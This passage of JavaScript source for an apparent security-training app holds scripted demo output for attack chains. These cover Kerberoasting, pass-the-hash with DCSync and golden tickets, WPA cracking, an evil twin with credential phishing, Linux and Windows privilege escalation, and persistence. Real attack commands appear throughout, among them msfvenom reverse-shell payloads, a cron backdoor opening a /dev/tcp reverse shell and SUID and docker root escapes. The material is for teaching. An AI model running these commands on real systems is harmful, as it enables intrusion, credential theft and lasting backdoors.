          '  📊 Collecting data with SharpHound...',
          '  ✅ Users, groups, computers, sessions, local admin',
          '  🔍 Analyzing attack paths...',
          '  🎯 Shortest path to DA: 3 hops',
          '  🎯 Attack path: User → Local Admin → DA',
          '',
          '📋 AD Enumeration Complete',
          '📊 Total objects: 384',
          '🔴 Attack paths to DA: 7 identified',
          '📄 Report: /reports/ad-enumeration-2026-04-19.pdf'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 500));
        }
      } else if (demoType === 'kerberoasting') {
        const steps = [
          '🎭 Kerberoasting Attack Training',
          '🎯 Target: CORP.LOCAL domain',
          '',
          '📡 Phase 1: Service Account Discovery',
          '  🔍 Querying SPNs...',
          '  ✅ Found: 12 service accounts with SPNs',
          '  📊 MSSQLSvc, HTTP, LDAP, CIFS services',
          '',
          '📡 Phase 2: TGS Request',
          '  🔍 Requesting TGS for MSSQLSvc/SQL01...',
          '  ✅ TGS received (encrypted with service NTLM hash)',
          '  📦 Format: Kirbi (base64)',
          '',
          '📡 Phase 3: Hash Extraction',
          '  🔍 Converting Kirbi to hashcat format...',
          '  ✅ Hash extracted: $krb5tgs$23$*MSSQLSvc...',
          '  📊 Hash type: 13100 (Kerberos 5 TGS-REP)',
          '',
          '📡 Phase 4: Offline Cracking',
          '  🔥 Running hashcat with rockyou.txt...',
          '  ⏱️ 2 minutes...',
          '  ✅ CRACKED: SQLService:SuperSecret123!',
          '  ⏱️ 5 minutes...',
          '  ✅ CRACKED: BackupSvc:Backup2026!',
          '',
          '📡 Phase 5: Credential Validation',
          '  🔍 Testing cracked credentials...',
          '  ✅ SQLService: Valid, can login to SQL01',
          '  ✅ BackupSvc: Valid, backup share access',
          '',
          '📡 Phase 6: Lateral Movement',
          '  💻 Using SQLService creds...',
          '  ✅ Logged into SQL01',
          '  📊 Local admin rights confirmed',
          '  🔍 Dumping LSASS for more creds...',
          '',
          '📋 Kerberoasting Attack Complete',
          '📊 SPNs enumerated: 12',
          '🔑 Passwords cracked: 2/12 (17%)',
          '🎯 Compromised hosts: 1',
          '📄 Report: /reports/kerberoasting-2026-04-19.pdf'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 600));
        }
      } else if (demoType === 'pass_the_hash') {
        const steps = [
          '🔑 Pass-the-Hash Attack Training',
          '🎯 Target: CORP.LOCAL domain',
          '',
          '📡 Phase 1: Credential Dumping',
          '  💻 Compromised host: WS01',
          '  🔍 Running Mimikatz...',
          '  ✅ Dumped LSASS memory',
          '  📊 Extracted: 8 NTLM hashes',
          '  🎯 Target: admin NTLM: aad3b435b51404ee...',
          '',
          '📡 Phase 2: Hash Validation',
          '  🔍 Testing hash with psexec...',
          '  ✅ Hash valid for Administrator',
          '  📍 Target: DC01.CORP.LOCAL',
          '',
          '📡 Phase 3: Lateral Movement',
          '  💻 Executing: psexec.py -hashes :aad3b4...',
          '  ✅ Shell obtained on DC01',
          '  👤 Context: NT AUTHORITY\\SYSTEM',
          '',
          '📡 Phase 4: Domain Recon',
          '  🔍 Running whoami /all...',
          '  ✅ Domain Admin group confirmed',
          '  🔍 Running net user /domain...',
          '  📊 All domain users enumerated',
          '',
          '📡 Phase 5: DCSync Attack',
          '  💻 Running Mimikatz DCSync...',
          '  ✅ Replicating domain data',
          '  📊 Dumped: krbtgt hash (golden ticket possible)',
          '  📊 Dumped: All user hashes',
          '',
          '📡 Phase 6: Persistence',
          '  🔍 Creating golden ticket...',
          '  ✅ Ticket created (valid 10 years)',
          '  🎯 Unlimited domain access',
          '',
          '📋 Pass-the-Hash Attack Complete',
          '🔴 Domain fully compromised',
          '📊 Hashes dumped: 247 users',
          '🎯 Persistence: Golden ticket active',
          '📄 Report: /reports/pass-the-hash-2026-04-19.pdf'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 600));
        }
      } else if (demoType === 'wpa_cracking') {
        const steps = [
          '📶 WPA2/WPA3 Cracking Training',
          '🎯 Target: TargetAP (BSSID: AA:BB:CC:11:22:33)',
          '',
          '📡 Phase 1: Interface Setup',
          '  $ sudo ip link set wlan0 down',
          '  $ sudo iw dev wlan0 set type monitor',
          '  $ sudo ip link set wlan0 up',
          '  ✅ Interface switched to monitor mode',
          '  $ iwconfig wlan0',
          '  wlan0: Mode:Monitor Frequency:2.437 GHz',
          '',
          '📡 Phase 2: Network Discovery',
          '  $ sudo airodump-ng wlan0',
          '  CH  6 ][ El: 00s ][ 2026-04-19 17:30',
          '  ',
          '  BSSID              PWR  Beacons  #Data  CH  MB   ENC CIPHER AUTH ESSID',
          '  AA:BB:CC:11:22:33  -45       142      0   6  54e  WPA2 CCMP   PSK  TargetAP',
          '  DD:EE:FF:44:55:66  -67        89      0  11  54e  WPA2 CCMP   PSK  NeighborNet',
          '  ',
          '  ✅ Target identified: TargetAP (Channel 6)',
          '  ✅ Clients associated: 3',
          '',
          '📡 Phase 3: Handshake Capture',
          '  $ sudo airodump-ng -c 6 --bssid AA:BB:CC:11:22:33 -w capture wlan0',
          '  CH  6 ][ El: 45s ][ 2026-04-19 17:31',
          '  ',
          '  Waiting for handshake...',
          '  ⏱️  2 minutes...',
          '  📡 Deauthenticating client...',
          '  $ sudo aireplay-ng -0 5 -a AA:BB:CC:11:22:33 wlan0',
          '  17:33:15  Sending DeAuth to station -- STMAC: XX:YY:ZZ:11:22:33',
          '  17:33:16  DeAuth sent to: AA:BB:CC:11:22:33',
          '  ✅ WPA Handshake captured!',
          '  📁 Saved: capture-01.cap (2.4 KB)',
          '',
          '📡 Phase 4: Handshake Verification',
          '  $ aircrack-ng capture-01.cap',
          '  Opening capture-01.cap',
          '  #      BSSID              ESSID                     Encryption',
          '  1      AA:BB:CC:11:22:33  TargetAP                  WPA (1 handshake)',
          '  ✅ Valid WPA handshake confirmed',
          '',
          '📡 Phase 5: PMKID Capture (Alternative)',
          '  $ sudo hcxdumptool -i wlan0 -o pmkid.pmkid --enable_status=1',
          '  INFO: cha=06, rx=142, rx(weakiv)=0, tx=0, err=0, aps=1',
          '  INFO: MAC AP: aabbcc112233 (TargetAP)',
          '  ✅ PMKID captured successfully',
          '  📁 Saved: pmkid.pmkid (512 bytes)',
          '',
          '📡 Phase 6: Hash Conversion',
          '  $ hcxpcapngtool -o hash.hc22000 capture-01.cap',
          '  summary: 1 handshake(s) processed',
          '  INFO: WPA-PBKDF2-PMKID+EAPOL written to hash.hc22000',
          '  $ cat hash.hc22000',
          '  WPA*02*targetap*...[hash truncated]...',
          '  ✅ Hash ready for cracking',
          '',
          '📡 Phase 7: Dictionary Attack',
          '  $ hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt',
          '  Session..........: hashcat',
          '  Status...........: Running',
          '  Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)',
          '  Time.Estimated...: 2 hours 34 minutes',
          '  ',
          '  ⏱️  3 minutes...',
          '  ',
          '  Session..........: hashcat',
          '  Status...........: Cracked',
          '  Hash.Type........: 22000 (WPA-PBKDF2-PMKID+EAPOL)',
          '  Password.........: Summer2026!',
          '  ',
          '  ✅ Password cracked successfully!',
          '  ⏱️  Total time: 3 minutes 47 seconds',
          '',
          '📡 Phase 8: Verification',
          '  📶 Connecting to TargetAP with cracked password...',
          '  $ sudo wpa_supplicant -i wlan0 -c <(wpa_passphrase "TargetAP" "Summer2026!")',
          '  wlan0: Associated with AA:BB:CC:11:22:33',
          '  wlan0: DHCPv4 address 192.168.1.105/24 via 192.168.1.1',
          '  ✅ Successfully connected to target network',
          '',
          '📋 WPA2 Cracking Complete',
          '📊 Networks scanned: 23',
          '🔑 Passwords cracked: 1/1 (100%)',
          '⏱️  Total time: 8 minutes',
          '📄 Report: /reports/wpa-cracking-2026-04-19.pdf',
          '✅ Training complete - WPA2/WPA3 cracking mastered'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 500));
        }
      } else if (demoType === 'evil_twin') {
        const steps = [
          '👥 Evil Twin Attack Training',
          '🎯 Target: CoffeeShopWiFi (WPA2)',
          '',
          '📡 Phase 1: Reconnaissance',
          '  $ sudo airodump-ng wlan0',
          '  CH  11 ][ El: 00s ][ 2026-04-19 17:45',
          '  ',
          '  BSSID              PWR  Beacons  #Data  CH  MB   ENC  ESSID',
          '  11:22:33:44:55:66  -50      234      45  11  54e  WPA2  CoffeeShopWiFi',
          '  ',
          '  ✅ Target: CoffeeShopWiFi',
          '  ✅ BSSID: 11:22:33:44:55:66',
          '  ✅ Channel: 11',
          '  ✅ Clients: 12 connected',
          '',
          '📡 Phase 2: Interface Setup',
          '  $ sudo ip link set wlan0 down',
          '  $ sudo iw dev wlan0 set type monitor',
          '  $ sudo ip link set wlan0 up',
          '  ✅ Monitor mode enabled',
          '  ',
          '  $ sudo ip link set wlan1 down',
          '  $ sudo iw dev wlan1 set type managed',
          '  $ sudo ip link set wlan1 up',
          '  $ sudo ifconfig wlan1 10.0.0.1/24',
          '  ✅ AP interface configured',
          '',
          '📡 Phase 3: Evil Twin AP Setup',
          '  Creating hostapd config...',
          '  $ cat > evil.conf << EOF',
          '  interface=wlan1',
          '  driver=nl80211',
          '  ssid=CoffeeShopWiFi',
          '  hw_mode=g',
          '  channel=11',
          '  auth_algs=1',
          '  wpa=2',
          '  wpa_passphrase=EvilTwin123',
          '  wpa_key_mgmt=WPA-PSK',
          '  wpa_pairwise=TKIP',
          '  rsn_pairwise=CCMP',
          '  EOF',
          '  ✅ Configuration created',
          '',
          '📡 Phase 4: DHCP & DNS Setup',
          '  $ cat > dnsmasq.conf << EOF',
          '  interface=wlan1',
          '  dhcp-range=10.0.0.100,10.0.0.200,12h',
          '  dhcp-option=3,10.0.0.1',
          '  dhcp-option=6,10.0.0.1',
          '  address=/#/10.0.0.1',
          '  EOF',
          '  $ sudo dnsmasq -C dnsmasq.conf -d',
          '  ✅ DNS/DHCP server started',
          '  ',
          '  dnsmasq: started, version 2.90',
          '  dnsmasq: compile time options: IPv6 GNU-getopt DBus',
          '  dnsmasq: DHCP, IP range 10.0.0.100 -- 10.0.0.200, lease time 12h',
          '',
          '📡 Phase 5: Deauthentication Attack',
          '  $ sudo aireplay-ng -0 10 -a 11:22:33:44:55:66 wlan0',
          '  17:47:22  Sending DeAuth to broadcast',
          '  17:47:23  DeAuth sent to: 11:22:33:44:55:66',
          '  17:47:24  Waiting for clients to reconnect...',
          '  ✅ Clients disconnected from legitimate AP',
          '',
          '📡 Phase 6: Client Connection',
          '  ⏱️  Waiting for reconnection...',
          '  📶 Client XX:YY:ZZ:11:22:33 connecting...',
          '  📶 Client XX:YY:ZZ:44:55:66 connecting...',
          '  📶 Client XX:YY:ZZ:77:88:99 connecting...',
          '  ✅ 3 clients connected to evil twin',
          '  ',
          '  $ dhcp-leases',
          '  1682012845 XX:YY:ZZ:11:22:33 10.0.0.100 iPhone-John',
          '  1682012847 XX:YY:ZZ:44:55:66 10.0.0.101 Laptop-Sarah',
          '  1682012850 XX:YY:ZZ:77:88:99 10.0.0.102 Android-Mike',
          '',
          '📡 Phase 7: Captive Portal',
          '  Starting phishing page...',
          '  $ sudo python3 captive_portal.py',
          '  Serving HTTP on 10.0.0.1 port 80...',
          '  ',
          '  🌐 Client 10.0.0.100 - GET /login.html',
          '  🌐 Client 10.0.0.101 - GET /login.html',
          '  📧 Credential captured: john@email.com / CoffeeLover123',
          '  📧 Credential captured: sarah@company.com / Sarah2026!',
          '  ✅ 2 credentials harvested',
          '',
          '📡 Phase 8: Traffic Monitoring',
          '  $ sudo tcpdump -i wlan1 -w capture.pcap',
          '  listening on wlan1, link-type EN10MB',
          '  17:48:15 IP 10.0.0.100.52341 > 93.184.216.34.80: HTTP GET',
          '  17:48:17 IP 10.0.0.101.49221 > 142.250.185.78.443: TLS Client Hello',
          '  ✅ Traffic capture active',
          '  📊 Packets captured: 1,247',
          '  📊 Data captured: 2.3 MB',
          '',
          '📋 Evil Twin Attack Complete',
          '📊 Clients compromised: 3',
          '🔑 Credentials captured: 2',
          '📦 Data intercepted: 2.3 MB',
          '⏱️  Total time: 12 minutes',
          '📄 Report: /reports/evil-twin-2026-04-19.pdf',
          '✅ Training complete - Evil Twin attacks mastered'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 600));
        }
      } else if (demoType === 'bluetooth_recon') {
        const steps = [
          '📶 Bluetooth Reconnaissance Training',
          '🎯 Target: Office Building (BLE devices)',
          '',
          '📡 Phase 1: Adapter Setup',
          '  $ sudo hciconfig hci0 up',
          '  hci0: Type: Primary Bus: USB',
          '  BD Address: 00:1A:7D:DA:71:13',
          '  ACL MTU: 310:10 SCO MTU: 64:8',
          '  UP RUNNING',
          '  ✅ Bluetooth adapter enabled',
          '',
          '📡 Phase 2: Device Discovery',
          '  $ sudo hcitool -i hci0 lescan --duplicates',
          '  LE Scan ...',
          '  ',
          '  4C:12:34:56:78:9A (unknown)',
          '  5E:AB:CD:EF:12:34 Fitbit Charge 5',
          '  6F:11:22:33:44:55 Apple Watch',
          '  7A:98:76:54:32:10 Samsung Galaxy Buds',
          '  8B:AA:BB:CC:DD:EE Philips Hue',
          '  9C:FF:EE:DD:CC:BB (unknown)',
          '  ',
          '  ✅ 6 BLE devices discovered',
          '  ⏱️  Scan duration: 30 seconds',
          '',
          '📡 Phase 3: Ubertooth Scanning',
          '  $ sudo ubertooth-scan -i ubertooth0',
          '  ubertooth-scan: scanning for 30 seconds',
          '  ',
          '  [ 00:00:05] 2C:54:91:88:C9:E3 -68 dBm',
          '  [ 00:00:12] 4C:12:34:56:78:9A -72 dBm',
          '  [ 00:00:18] 5E:AB:CD:EF:12:34 -65 dBm (Fitbit)',
          '  [ 00:00:23] 6F:11:22:33:44:55 -70 dBm (Apple)',
          '  ',
          '  ✅ 4 classic Bluetooth devices found',
          '  ✅ Signal strength mapped',
          '',
          '📡 Phase 4: Device Fingerprinting',
          '  $ sudo btpt -i hci0 -t 5E:AB:CD:EF:12:34',
          '  ',
          '  Device: 5E:AB:CD:EF:12:34',
          '  Name: Fitbit Charge 5',
          '  Class: 0x00410404',
          '  LMP Version: 5.1 (0xA)',
          '  Manufacturer: Fitbit Inc. (0x00D8)',
          '  Features:',
          '    ✓ LE Supported',
          '    ✓ Encryption',
          '    ✓ Connection Parameter Request',
          '  ',
          '  ✅ Device fingerprinted successfully',
          '',
          '📡 Phase 5: GATT Enumeration',
          '  $ gatttool -b 5E:AB:CD:EF:12:34 -I',
          '  Attempting to connect to 5E:AB:CD:EF:12:34',
          '  Connection successful',
          '  ',
          '  [5E:AB:CD:EF:12:34][LE]> primary',
          '  attr handle = 0x0001, end grp handle = 0x0009',
          '  UUID: 0x1800 (Generic Access)',
          '  attr handle = 0x000a, end grp handle = 0x000f',
          '  UUID: 0x1801 (Generic Attribute)',
          '  attr handle = 0x0010, end grp handle = 0x00ff',
          '  UUID: 0x1804 (Battery Service)',
          '  ',
          '  ✅ 12 GATT services discovered',
          '',
          '📡 Phase 6: Characteristic Read',
          '  [5E:AB:CD:EF:12:34][LE]> characteristics',
          '  handle = 0x0011, char prop = 0x02, char value handle = 0x0012',
          '  UUID: 0x2a19 (Battery Level)',
          '  ',
          '  [5E:AB:CD:EF:12:34][LE]> char-read-hnd 0x0012',
          '  Value: 0x5a (90%)',
          '  ',
          '  ✅ Battery level: 90%',
          '  ✅ Device active and responding',
          '',
          '📡 Phase 7: Packet Capture',
          '  $ sudo ubertooth-btle -f 5E:AB:CD:EF:12:34 -c capture.pcap',
          '  ubertooth-btle: capturing BLE traffic',
          '  ',
          '  [ 00:00:15] 23 packets captured',
          '  [ 00:00:30] 47 packets captured',
          '  [ 00:00:45] 68 packets captured',
          '  ',
          '  ✅ BLE traffic captured',
          '  📊 Total packets: 68',
          '  📊 Data size: 12.4 KB',
          '',
          '📡 Phase 8: Device Tracking',
          '  Analyzing RSSI for location tracking...',
          '  ',
          '  Device: 5E:AB:CD:EF:12:34 (Fitbit)',
          '  ',
          '  Time      RSSI    Location Estimate',
          '  17:30:00  -65 dBm  Near entrance',
          '  17:32:00  -58 dBm  Moving closer',
          '  17:35:00  -52 dBm  Conference room A',
          '  17:38:00  -61 dBm  Hallway',
          '  17:40:00  -70 dBm  Moving away',
          '  ',
          '  ✅ Device movement tracked',
          '  📍 Last known: Conference room A',
          '',
          '📋 Bluetooth Reconnaissance Complete',
          '📊 BLE devices found: 6',
          '📊 Classic BT found: 4',
          '📊 Devices fingerprinted: 3',
          '📊 Packets captured: 68',
          '⏱️  Total time: 15 minutes',
          '📄 Report: /reports/bluetooth-recon-2026-04-19.pdf',
          '✅ Training complete - Bluetooth recon mastered'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 600));
        }
      } else if (demoType === 'linux_privesc') {
        const steps = [
          '🐧 Linux Privilege Escalation Training',
          '🎯 Target: Ubuntu 20.04 LTS (192.168.1.50)',
          '',
          '📡 Phase 1: Initial Access',
          '  $ whoami',
          '  www-data',
          '  $ id',
          '  uid=33(www-data) gid=33(www-data) groups=33(www-data)',
          '  ✅ Web shell obtained via file upload',
          '',
          '📡 Phase 2: System Enumeration',
          '  $ uname -a',
          '  Linux target 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64',
          '  $ cat /etc/os-release',
          '  NAME="Ubuntu"',
          '  VERSION="20.04 LTS (Focal Fossa)"',
          '  ✅ OS: Ubuntu 20.04 LTS',
          '',
          '📡 Phase 3: LinPEAS Execution',
          '  $ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
          '  ',
          '  ╔════════════════════════════════════════════════════╗',
          '  ║ LinPEAS v4.3.0 - Linux Privilege Escalation       ║',
          '  ╚════════════════════════════════════════════════════╝',
          '  ',
          '  [+] Kernel information',
          '  Linux 5.4.0-42-generic x86_64',
          '  ',
          '  [+] User Environment',
          '  www-data is in sudoers group: NO',
          '  www-data is in docker group: YES',
          '  ',
          '  [+] Capabilities',
          '  /usr/bin/python3 = cap_setuid+ep',
          '  ',
          '  [+] SUID Binaries',
          '  -rwsr-xr-x 1 root root 166056 Jun 15  2022 /usr/bin/find',
          '  ',
          '  [+] Cron Jobs',
          '  * * * * * root /opt/backup.sh',
          '  ',
          '  [+] Password in Files',
          '  /var/www/html/config.php: $db_password = "SuperSecret123!";',
          '  ',
          '  ✅ 5 potential escalation vectors found',
          '',
          '📡 Phase 4: Docker Group Escape',
          '  $ docker --version',
          '  Docker version 20.10.12, build e91ed57',
          '  ',
          '  $ docker run -v /:/mnt --rm -it alpine chroot /mnt sh',
          '  # whoami',
          '  root',
          '  # cat /etc/shadow | head -3',
          '  root:$6$xyz...:19000:0:99999:7:::',
          '  ✅ Docker escape successful - root access!',
          '',
          '📡 Phase 5: SUID Find Exploitation',
          '  $ /usr/bin/find . -exec /bin/sh \; -quit',
          '  # whoami',
          '  root',
          '  # id',
          '  uid=0(root) gid=0(root) groups=0(root)',
          '  ✅ SUID exploitation successful',
          '',
          '📡 Phase 6: Python Capability Abuse',
          '  $ /usr/bin/python3 -c \'import os; os.setuid(0); os.system("/bin/sh")\'',
          '  # whoami',
          '  root',
          '  ✅ Capability abuse successful',
          '',
          '📡 Phase 7: Cron Job Exploitation',
          '  $ cat /opt/backup.sh',
          '  #!/bin/bash',
          '  tar -czf /backup/web.tar.gz /var/www/html',
          '  ',
          '  $ echo \'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\' > /opt/backup.sh',
          '  ⏱️  Waiting for cron execution...',
          '  ',
          '  $ /tmp/rootbash -p',
          '  # whoami',
          '  root',
          '  ✅ Cron job exploitation successful',
          '',
          '📡 Phase 8: Password Hash Extraction',
          '  # cat /etc/shadow',
          '  root:$6$xyz...:19000:0:99999:7:::',
          '  admin:$6$abc...:19001:0:99999:7:::',
          '  ',
          '  # john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt',
          '  admin:password123      (admin)',
          '  ✅ Password cracked: admin:password123',
          '',
          '📋 Linux Privilege Escalation Complete',
          '🔴 Root access achieved via 4 vectors',
          '📊 Vectors found: Docker, SUID, Capabilities, Cron',
          '⏱️  Total time: 12 minutes',
          '📄 Report: /reports/linux-privesc-2026-04-19.pdf',
          '✅ Training complete - Linux privesc mastered'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 500));
        }
      } else if (demoType === 'windows_privesc') {
        const steps = [
          '🪟 Windows Privilege Escalation Training',
          '🎯 Target: Windows Server 2019 (192.168.1.100)',
          '',
          '📡 Phase 1: Initial Access',
          '  $ whoami',
          '  iis apppool\defaultapppool',
          '  $ hostname',
          '  WEB-SERVER-01',
          '  ✅ Web shell obtained via ASPX upload',
          '',
          '📡 Phase 2: System Enumeration',
          '  $ systeminfo',
          '  Host Name:                 WEB-SERVER-01',
          '  OS Name:                   Microsoft Windows Server 2019 Datacenter',
          '  OS Version:                10.0.17763 N/A Build 17763',
          '  System Type:               x64-based PC',
          '  ✅ OS: Windows Server 2019',
          '',
          '📡 Phase 3: WinPEAS Execution',
          '  PS C:\> .\winPEASx64.exe',
          '  ',
          '  ╔════════════════════════════════════════════════════╗',
          '  ║ WinPEAS v4.3.0 - Windows Privilege Escalation     ║',
          '  ╚════════════════════════════════════════════════════╝',
          '  ',
          '  [+] Basic System Information',
          '  Windows Server 2019 Build 17763',
          '  ',
          '  [+] User Groups',
          '  * Members of Administrators group: NO',
          '  * Members of Backup Operators: YES',
          '  ',
          '  [+] AlwaysInstallElevated',
          '  HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer',
          '      AlwaysInstallElevated = 1',
          '  ',
          '  [+] Unquoted Service Paths',
          '  C:\Program Files\MyApp\My Service\service.exe',
          '  ',
          '  [+] Stored Credentials',
          '  C:\Users\admin\AppData\Local\Microsoft\Credentials\backup.xml',
          '  ',
          '  [+] PowerShell History',
          '  $password = "Welcome123!"',
          '  ',
          '  ✅ 6 potential escalation vectors found',
          '',
          '📡 Phase 4: Backup Operator Privilege',
          '  PS C:\> whoami /priv',
          '  ',
          '  PRIVILEGES INFORMATION',
          '  ======================',
          '  SeBackupPrivilege                Enabled',
          '  SeRestorePrivilege               Enabled',
          '  ',
          '  PS C:\> reg save HKLM\SYSTEM system.hive',
          '  The operation completed successfully.',
          '  PS C:\> reg save HKLM\SAM sam.hive',
          '  The operation completed successfully.',
          '  ',
          '  PS C:\> impacket-secretsdump -sam sam.hive -system system.hive LOCAL',
          '  [*] Target system boot key: 0x1234567890abcdef',
          '  [*] Dumping local SAM...',
          '  Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b427:::',
          '  admin:1000:aad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::',
          '  ✅ SAM hashes extracted',
          '',
          '📡 Phase 5: AlwaysInstallElevated Exploit',
          '  PS C:\> msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi',
          '  [-] No platform was selected, choosing Msf::Module::Platform::Windows',
          '  [-] No arch selected, selecting arch: x86',
          '  Found 11 compatible payloads',
          '  [*] Final size: 154321 bytes',
          '  Saved as: evil.msi',
          '  ',
          '  PS C:\> msiexec /quiet /i evil.msi',
          '  ⏱️  Waiting for installation...',
          '  ',
          '  ✅ User created with admin privileges',
          '',
          '📡 Phase 6: Unquoted Service Path',
          '  PS C:\> wmic service get name,displayname,pathname,startmode',
          '  ',
          '  Name          DisplayName        PathName',
          '  MyService     My Application     C:\Program Files\MyApp\My Service\service.exe',
          '  ',
          '  PS C:\> msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o service.exe',
          '  PS C:\> copy service.exe "C:\Program Files\MyApp\service.exe"',
          '  PS C:\> sc start MyService',
          '  ',
          '  ⏱️  Waiting for service start...',
          '  ✅ Reverse shell received as SYSTEM',
          '',
          '📡 Phase 7: Token Impersonation',
          '  PS C:\> whoami /priv',
          '  SeImpersonatePrivilege           Enabled',
          '  ',
          '  PS C:\> .\RogueWinRM.exe -p C:\tools\nc64.exe -a "-e cmd.exe"',
          '  [*] Spawning local process...',
          '  [*] Listening on named pipe...',
          '  [*] Got connection!',
          '  ',
          '  C:\> whoami',
          '  nt authority\system',
          '  ✅ Token impersonation successful - SYSTEM access!',
          '',
          '📋 Windows Privilege Escalation Complete',
          '🔴 SYSTEM access achieved via 4 vectors',
          '📊 Vectors found: Backup, AlwaysInstallElevated, Unquoted Path, Token',
          '⏱️  Total time: 15 minutes',
          '📄 Report: /reports/windows-privesc-2026-04-19.pdf',
          '✅ Training complete - Windows privesc mastered'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 500));
        }
      } else if (demoType === 'persistence') {
        const steps = [
          '🔐 Persistence Mechanisms Training',
          '🎯 Target: Ubuntu 20.04 + Windows Server 2019',
          '',
          '📡 Phase 1: Linux - SSH Key Installation',
          '  $ mkdir -p /root/.ssh',
          '  $ echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@kali" >> /root/.ssh/authorized_keys',
          '  $ chmod 600 /root/.ssh/authorized_keys',
          '  $ chmod 700 /root/.ssh',
          '  ✅ SSH key installed',
          '  ',
          '  $ ssh -i ~/.ssh/id_rsa root@target',
          '  Welcome to Ubuntu 20.04.3 LTS',
          '  ✅ Persistent access confirmed',
          '',
          '📡 Phase 2: Linux - Cron Job Backdoor',
          '  $ cat /etc/cron.d/backdoor',
          '  */5 * * * * root /tmp/.hidden/backdoor.sh',
          '  ',
          '  $ cat /tmp/.hidden/backdoor.sh',
          '  #!/bin/bash',
          '  bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
          '  ',
          '  $ chmod +x /tmp/.hidden/backdoor.sh',
          '  ✅ Cron backdoor installed',
          '',
          '📡 Phase 3: Linux - Systemd Service',
          '  $ cat /etc/systemd/system/update-service.service',
          '  [Unit]',
          '  Description=System Update Service',
          '  After=network.target',
          '  ',
          '  [Service]',
          '  Type=simple',
          '  ExecStart=/usr/local/bin/update-daemon',
          '  Restart=always',
          '  ',
          '  [Install]',
          '  WantedBy=multi-user.target',
          '  ',
          '  $ systemctl enable update-service',
          '  Created symlink /etc/systemd/system/multi-user.target.wants/update-service.service',
          '  $ systemctl start update-service',
          '  ✅ Systemd persistence established',
          '',
          '📡 Phase 4: Windows - Registry Run Key',
          '  PS C:\> New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"',
          '  -Name "WindowsUpdate" -PropertyType String -Value "C:\\Windows\\Temp\\update.exe" -Force',
          '  ',
          '  Name                           Property',
          '  ----                           --------',
          '  WindowsUpdate                  C:\\Windows\\Temp\\update.exe',
          '  ',
          '  ✅ Registry run key created',
          '',
          '📡 Phase 5: Windows - Scheduled Task',
          '  PS C:\> schtasks /create /tn "Microsoft\\Windows\\Update" /tr "C:\\Windows\\Temp\\update.exe" /sc onlogon /ru SYSTEM',
          '  ',
          '  SUCCESS: The scheduled task "Microsoft\\Windows\\Update" has successfully been created.',
          '  ',
          '  PS C:\> schtasks /query /tn "Microsoft\\Windows\\Update"',
          '  ',
          '  Folder: \Microsoft\Windows',
          '  HostName:                             WEB-SERVER-01',
          '  TaskName:                             \Microsoft\Windows\Update',
          '  Status:                               Ready',
          '  Trigger Type:                         At Logon',
          '  ',
          '  ✅ Scheduled task created',
          '',
          '📡 Phase 6: Windows - WMI Event Subscription',
          '  PS C:\> $filterName = "WindowsUpdateFilter"',
          '  PS C:\> $consumerName = "WindowsUpdateConsumer"',
          '  PS C:\> $scriptPath = "C:\\Windows\\Temp\\update.vbs"',
          '  ',
          '  PS C:\> $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription',
          '  -Arguments @{Name=$filterName; EventNameSpace="root\cimv2"; QueryLanguage="WQL";',
          '  Query="SELECT * FROM __InstanceModificationAction WITHIN 60 WHERE",',
          '  ',
          '  PS C:\> $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription',
          '  -Arguments @{Name=$consumerName; ExecutablePath="wscript.exe";',
          '  CommandLineTemplate="$scriptPath"}',
          '  ',
          '  PS C:\> Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription',
          '  -Arguments @{Filter=$filter; Consumer=$consumer}',
          '  ',
          '  ✅ WMI persistence established',
          '',
          '📡 Phase 7: Windows - Golden Ticket',
          '  PS C:\> mimikatz # kerberos::golden /user:backdoor /domain:CORP.LOCAL',
          '  /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:1234567890abcdef',
          '  /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:43200 /ptt',
          '  ',
          '  [*] Golden ticket generated',
          '  [*] Ticket imported to memory',
          '  ',
          '  PS C:\> klist',
          '  00:     Client: backdoor @ CORP.LOCAL',
          '  Server: krbtgt/CORP.LOCAL @ CORP.LOCAL',
          '  End Time: 12/31/2036',
          '  ',
          '  ✅ Golden ticket active (valid 10 years)',
          '',
          '📋 Persistence Mechanisms Complete',
          '🔴 Linux persistence: 3 methods (SSH, Cron, Systemd)',
          '🔴 Windows persistence: 4 methods (Registry, Task, WMI, Golden Ticket)',
          '⏱️  Total time: 10 minutes',
          '📄 Report: /reports/persistence-2026-04-19.pdf',
          '✅ Training complete - Persistence mastered'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 500));
        }
      } else if (demoType === 'lateral_movement') {
        const steps = [
